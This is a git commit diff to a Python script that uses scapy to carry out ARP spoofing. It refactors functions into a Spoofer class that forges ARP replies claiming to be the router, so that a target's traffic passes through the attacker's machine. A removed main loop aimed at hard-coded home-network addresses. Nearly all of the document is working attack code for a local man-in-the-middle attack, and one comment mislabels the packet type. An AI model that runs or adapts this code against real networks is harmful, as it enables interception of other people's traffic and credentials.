34f90b1025dbf949bb82e5158bb3a72d721ff693
Idan Retyk <idaniretyk@gmail.com>
2025-03-23 13:17:46 +0200

    help spoofing

--- src/netwroking.py
+++ src/netwroking.py
@@ -2,58 +2,60 @@ import scapy.all as scapy
 from scapy.layers.l2 import ARP,Ether
 
 
-def restore_defaults(dest, source):
-    # getting the real MACs
-    target_mac = get_mac(dest) # 1st (router), then (windows)
-    source_mac = get_mac(source)
-    # creating the packet
-    packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
-    # sending the packet
-    scapy.send(packet, verbose=False)
 
-def get_mac(ip: str):
-    """Get mac of the router using actual ARP.
+class Spoofer:
+    def __init__(self,host_ip,target_ip,router_ip) -> None:
+        self.__ip = host_ip
+        self.__target_ip = target_ip
+        self.__router_ip = router_ip
 
-    Args:
-        ip (str): ipv4 of the target.
+    def spoof(self): # Main
+        """sending spoofed packet.
+        """
+        # getting the MAC of the target
+        target_mac = self.get_mac(self.__target_ip)
+        # generating the spoofed packet modifying the source and the target
+        packet = ARP(op=2, # request
+                        hwdst=target_mac, # mac destination - target mac
+                        pdst=self.__target_ip, # ip destination
+                    psrc=self.__router_ip) # ip source
+        # This packet is saying - I am the router.
 
-    Returns:
-        mac address of the target.
-    """
-    # request that contain the IP destination of the target
-    request = ARP(pdst=ip)
-    # broadcast packet creation
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    # concat packets
-    final_packet = broadcast / request
-    # getting the response
-    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
-    # getting the MAC (its src because its a response)
-    mac = answer[0][1].hwsrc
-    return mac
+        # sending the packet
+        scapy.send(packet, verbose=False)
 
-# we will send the packet to the target by pretending being the spoofed
-def spoofing(target_ip, router_ip):
-    # getting the MAC of the target
-    target_mac = get_mac(target_ip)
-    # generating the spoofed packet modifying the source and the target
-    packet = ARP(op=2, # request
-                    hwdst=target_mac, # mac destination - target mac
-                    pdst=target_ip, # ip destination
-                psrc=router_ip) # ip source
-    # This packet is saying - I am the router.
+            
     
+    def checkout(self):
+        """stop spoofing.
+        """
+        self.restore_defaults(self.__target_ip,self.__ip)
     
-    # sending the packet
-    scapy.send(packet, verbose=False)
+    def restore_defaults(self,dest, source):
+        # getting the real MACs
+        target_mac = self.get_mac(dest) # 1st (router), then (windows)
+        source_mac = self.get_mac(source)
+        # creating the packet
+        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
+        # sending the packet
+        scapy.send(packet, verbose=False)
 
-def main():
-    try:
-        while True:
-            spoofing("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
-            spoofing("192.168.1.130", "192.168.1.1") # win PC
-    except KeyboardInterrupt:
-        print("[!] Process stopped. Restoring defaults .. please hold")
-        restore_defaults("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
-        restore_defaults("192.168.1.130", "192.168.1.1") # win PC
-        exit(0)
+    def get_mac(self,ip: str):
+        """Get mac of the router using actual ARP.
+
+        Args:
+            ip (str): ipv4 of the target.
+
+        Returns:
+            mac address of the target.
+        """
+        # request that contain the IP destination of the target
+        # broadcast packet creation
+        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        # getting the response
+        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+        # getting the MAC (its src because its a response)
+        mac = answer[0][1].hwsrc
+        return mac
+
+
